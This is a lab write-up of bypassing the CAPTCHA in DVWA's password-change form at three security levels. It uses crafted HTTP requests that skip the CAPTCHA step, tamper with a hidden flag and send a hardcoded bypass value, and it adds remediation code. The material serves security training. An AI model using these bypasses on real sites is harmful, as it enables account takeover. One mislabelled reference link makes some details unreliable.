# Lab Write-Up: Insecure CAPTCHA
**Date:** 2026-09-11  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Broken Authentication / Logic Flaw  
**OWASP Top 10:** A07:2021 – Identification and Authentication Failures  

---

## 1. Introduction

CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) is designed to prevent automated attacks on forms. However, poorly implemented CAPTCHAs can be bypassed through logical flaws — not by solving them, but by exploiting how the server validates (or fails to validate) the CAPTCHA completion.

**Goal of this lab:** Bypass the CAPTCHA protection in DVWA to change a user's password without solving the CAPTCHA challenge.

---

## 2. Environment Setup

| Component        | Details                                              |
|------------------|------------------------------------------------------|
| **Target App**   | DVWA – Insecure CAPTCHA Module                       |
| **Attacker OS**  | Kali Linux                                           |
| **Tools Used**   | Burp Suite, Browser (Developer Tools)                |
| **Network**      | Local lab (NAT/Host-Only)                            |
| **Pre-req**      | reCAPTCHA v2 key pair configured in `config.inc.php` |

**Setup reCAPTCHA (if needed):**
```bash
# Edit DVWA config
nano /var/www/html/dvwa/config/config.inc.php

# Add your keys
$_DVWA['recaptcha_public_key']  = 'YOUR_SITE_KEY';
$_DVWA['recaptcha_private_key'] = 'YOUR_SECRET_KEY';
```

> Register for free reCAPTCHA keys at: https://www.google.com/recaptcha/admin

---

## 3. Vulnerability Overview

### What is Insecure CAPTCHA?

An insecure CAPTCHA implementation doesn't truly protect the underlying action — it's bypassed through:
- **Multi-step logic flaws:** Only the first step has a CAPTCHA, the second step executes the action
- **Hidden field manipulation:** A `passed_captcha=true` parameter is controlled client-side
- **Developer test values:** Hard-coded bypass values left in production code

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → Insecure CAPTCHA. Set security to **Low**.

**Observation:** The password change form shows a CAPTCHA checkbox ("I'm not a robot"). The process is split into **two steps**:
- Step 1: Solve the CAPTCHA → confirms you're human
- Step 2: Confirm and apply the password change

#### Step 1 – Understand the Two-Step Flow

**Step 1 request (with CAPTCHA):**
```
POST /dvwa/vulnerabilities/captcha/ HTTP/1.1

step=1&password_new=test&password_conf=test&recaptcha_response_field=...&Change=Change
```

**Step 2 request (actual password change):**
```
POST /dvwa/vulnerabilities/captcha/ HTTP/1.1

step=2&password_new=test&password_conf=test&Change=Change
```

#### Step 2 – Skip Step 1, Send Step 2 Directly

The CAPTCHA is ONLY checked in Step 1. Step 2 applies the password change with **no CAPTCHA check**.

Using Burp Repeater, craft and send Step 2 directly:

```http
POST /dvwa/vulnerabilities/captcha/ HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc123; security=low
Content-Type: application/x-www-form-urlencoded

step=2&password_new=hacked123&password_conf=hacked123&Change=Change
```

**Result:**
```
Password Changed.
```

✅ CAPTCHA completely bypassed — password changed without solving the challenge!

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** The two-step flow is now replaced with a single step, but a hidden field `passed_captcha` is used to track CAPTCHA completion.

#### Step 1 – Submit the Form and Intercept

Fill the form and click "Change Password". Intercept in Burp.

**Intercepted POST body:**
```
password_new=test&password_conf=test&passed_captcha=false&Change=Change
```

#### Step 2 – Manipulate the Hidden Parameter

The `passed_captcha` parameter is **client-controlled**. Change it from `false` to `true` in Burp:

**Modified POST body:**
```
password_new=hacked123&password_conf=hacked123&passed_captcha=true&Change=Change
```

**Forward the modified request.**

**Result:**
```
Password Changed.
```

✅ CAPTCHA bypassed by simply changing a hidden field value!

#### Alternative – Modify Before Submitting (via Browser DevTools)

1. Right-click the form → Inspect Element
2. Find the hidden field: `<input type="hidden" name="passed_captcha" value="false">`
3. Change `value="false"` to `value="true"`
4. Submit the form normally
5. No Burp needed — works directly in browser

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The page source contains a suspicious dev/debug value that bypasses Google's reCAPTCHA verification. The server-side check includes a workaround for development purposes that was left in production code.

#### Step 1 – Inspect the Page Source

Open the DVWA Insecure CAPTCHA page → View Page Source:

```html
<!-- Development bypass - TODO: Remove before production! -->
<input type="hidden" name="recaptcha_challenge_field" value="hidd3n_valu3" />
```

Or look in the DVWA source code:
```php
// In the High level source
if ($_POST['g-recaptcha-response'] == 'hidd3n_valu3') {
    $captcha_pass = true;
}
```

#### Step 2 – Use the Hardcoded Bypass Value

Using Burp, intercept the form submission and add/modify the CAPTCHA response field:

**POST body:**
```
step=1&password_new=hacked123&password_conf=hacked123&g-recaptcha-response=hidd3n_valu3&Change=Change
```

**Result:**
```
Password Changed.
```

✅ Hardcoded dev bypass exploited!

#### Alternative – Parameter Tampering in Burp

1. Submit the form with `g-recaptcha-response=anything`
2. Intercept in Burp
3. Change the value to `hidd3n_valu3`
4. Forward

---

## 5. Full Attack Comparison

| Security Level | Flaw Type               | Bypass Technique                        |
|----------------|-------------------------|-----------------------------------------|
| Low            | Multi-step logic        | Submit Step 2 directly (skip CAPTCHA)   |
| Medium         | Client-controlled param | Change `passed_captcha=false` to `true` |
| High           | Hardcoded bypass value  | Use `g-recaptcha-response=hidd3n_valu3` |

---

## 6. Findings Summary

| Security Level | Vulnerable | Bypass Method              | Time Required |
|----------------|------------|----------------------------|---------------|
| Low            | ✅ Yes     | Step 2 direct submission   | Seconds       |
| Medium         | ✅ Yes     | Hidden field manipulation  | Seconds       |
| High           | ✅ Yes     | Hardcoded dev bypass value | Seconds       |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | High     |
| **CVSS Score** | 7.5      |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: Low |

**Business Impact:**
- Password change without authentication verification → account takeover
- CAPTCHA provides false sense of security
- Combined with CSRF: attacker can automate password changes for many users
- Authentication bypass enables access to protected functionality

---

## 8. Remediation Recommendations

| Fix                                 | Description                                                     |
|-------------------------------------|-----------------------------------------------------------------|
| **Server-Side CAPTCHA Verification**| Always verify CAPTCHA response with the provider server-side    |
| **Remove Debug/Dev Code**           | Never leave hardcoded bypass values in production               |
| **Re-verify at Every Step**         | In multi-step flows, verify CAPTCHA at the final action step   |
| **State Validation**                | Don't trust client-supplied state flags like `passed_captcha`  |
| **Require Current Password**        | For password changes, always require current password input     |
| **Rate Limiting**                   | Even with CAPTCHA, limit password change attempts per IP        |

**Secure Code (PHP):**
```php
// Verify reCAPTCHA server-side
function verifyCaptcha($response) {
    $url = 'https://www.google.com/recaptcha/api/siteverify';
    $data = [
        'secret'   => RECAPTCHA_PRIVATE_KEY,
        'response' => $response,
        'remoteip' => $_SERVER['REMOTE_ADDR']
    ];
    $options = [
        'http' => [
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $result = json_decode(file_get_contents($url, false, stream_context_create($options)));
    return $result->success;
}

// Use it
if (!verifyCaptcha($_POST['g-recaptcha-response'])) {
    die('CAPTCHA verification failed');
}
```

---

## 9. References

- [OWASP Testing for CAPTCHA](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/)
- [Google reCAPTCHA Documentation](https://developers.google.com/recaptcha)
- [DVWA Insecure CAPTCHA Walkthrough – ch3ngo](https://ch3ngo.github.io/posts/insecure-captcha_dvwa_walkthrough/)
- [DVWA Insecure CAPTCHA – cspanias](https://cspanias.github.io/posts/DVWA-Insecure-CAPTCHA)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – Insecure CAPTCHA Module
Low:       POST step=2&password_new=hacked123 (skip CAPTCHA step entirely)
Medium:    POST passed_captcha=true (client-controlled flag)
High:      POST g-recaptcha-response=hidd3n_valu3 (hardcoded bypass)
Result:    Password changed without solving CAPTCHA at all 3 levels
Severity:  HIGH (CVSS 7.5)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
